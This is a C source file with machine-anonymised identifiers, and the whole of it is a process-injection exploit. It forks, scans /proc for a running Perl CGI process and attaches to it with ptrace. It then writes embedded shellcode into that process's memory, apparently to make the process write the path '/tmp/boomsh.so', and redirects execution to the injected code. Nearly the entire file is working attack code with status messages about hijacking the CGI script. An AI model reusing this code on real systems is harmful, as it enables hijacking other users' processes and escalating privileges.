
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int fname ;
typedef int code ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int FUNC_0 (int) ;
 int FUNC_1 (char*) ;
 scalar_t__ VAR_7 ;
 int FUNC_2 (int ) ;
 scalar_t__ FUNC_3 () ;
 int FUNC_4 () ;
 int FUNC_5 (char*,int ) ;
 int FUNC_6 (char*,...) ;
 scalar_t__ FUNC_7 (int ,int,int,unsigned int) ;
 int FUNC_8 (int,char*,int) ;
 int FUNC_9 (char*,int,char*,int) ;
 scalar_t__ FUNC_10 (char*,char*) ;
 int FUNC_11 (int,int *,int ) ;

int FUNC_12()
{
 int VAR_8, VAR_9, VAR_10, VAR_11, VAR_12 = 0;
 unsigned int VAR_13;
 char VAR_14[1024];
 char VAR_15[] =
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\xe8\x10\x00\x00\x00\x2f\x74\x6d\x70\x2f\x62\x6f"
  "\x6f\x6d\x73\x68\x2e\x73\x6f\x0a\x00\xb8\x04\x00"
  "\x00\x00\xbb\x05\x00\x00\x00\x59\xba\x0f\x00\x00"
  "\x00\xcd\x80\xb8\x01\x00\x00\x00\x31\xdb\xcd\x80";
 unsigned long *VAR_16;

 FUNC_6("Forking off proc-scan to attach to CGI-script.\n");

 if (FUNC_3() > 0)
  return 0;

 VAR_8 = FUNC_4();

 while (!VAR_12) {
  for (VAR_10 = 0; VAR_10 < 100; ++VAR_10) {
   FUNC_9(VAR_14, sizeof(VAR_14), "/proc/%d/cmdline", VAR_8+VAR_10);
   if ((VAR_9 = FUNC_5(VAR_14, VAR_1)) < 0)
    continue;
   FUNC_8(VAR_9, VAR_14, sizeof(VAR_14));
   FUNC_0(VAR_9);
   if (FUNC_10(VAR_14, "/usr/bin/perl") == 0) {
    if (FUNC_7(VAR_2, VAR_8+VAR_10,0,0) < 0) {
     VAR_11 = VAR_8+VAR_10;
     VAR_12 = 1;
     break;
    }
   }
  }
 }

 FUNC_6("Got cgi-bin PID %d\n", VAR_11);

 FUNC_11(VAR_11, ((void*)0), 0);

 VAR_13 = FUNC_7(VAR_4, VAR_11, 4*VAR_0, 0);
 if (VAR_7)
  FUNC_1("ptrace");
 for (VAR_16 = (unsigned long*)VAR_15; VAR_10 < sizeof(VAR_15); VAR_10+= 4, ++VAR_16) {
  if (FUNC_7(VAR_5, VAR_11, VAR_13 + VAR_10, *VAR_16) < 0)
   FUNC_1("ptrace");
 }

 if (FUNC_7(VAR_6, VAR_11, 4*VAR_0, VAR_13+4) < 0)
  FUNC_1("ptrace");

 if (FUNC_7(VAR_3, VAR_11, 0, 0) < 0)
  FUNC_1("ptrace");
 FUNC_6("Injecting of write-code finished.\n");
 FUNC_2(0);
}
